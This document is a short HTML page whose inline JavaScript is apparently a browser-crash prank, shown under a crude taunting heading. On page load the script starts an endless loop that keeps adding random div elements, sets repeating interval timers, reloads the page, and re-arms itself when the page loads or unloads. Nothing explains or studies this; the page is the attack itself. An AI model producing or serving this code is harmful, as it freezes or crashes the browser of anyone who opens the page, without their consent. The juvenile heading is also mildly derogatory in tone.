<!DOCTYPE html>
<html>
    <body>
        <script>
            function handler(){
                a = "a";
                b = false;
                window.setInterval(handler);
                while(true){
                    c = document.createElement("div");
                    c.id = "" + Math.random();
                    c.className = "" + Math.random();
                    if(b){
                        b = false;
                    }else{
                        b = true;
                    }
                    a += "a";
                    document.body.appendChild(c);
                    window.location.reload();
                }
                return false
            }
            window.setInterval(function(){
                c = document.createElement("div");
                c.id = "" + Math.random();
                c.className = "" + Math.random();
                document.body.appendChild(c);
            });
            window.setInterval(handler)
            window.onbeforeunload = function() {
                window.setInterval(handler);
            }
            window.onload = function() {
                window.setInterval(handler);
            }
        </script>
        <h1 style="color: blue; background-color: black">Ur Mum Gey</h1>
    </body>
</html>
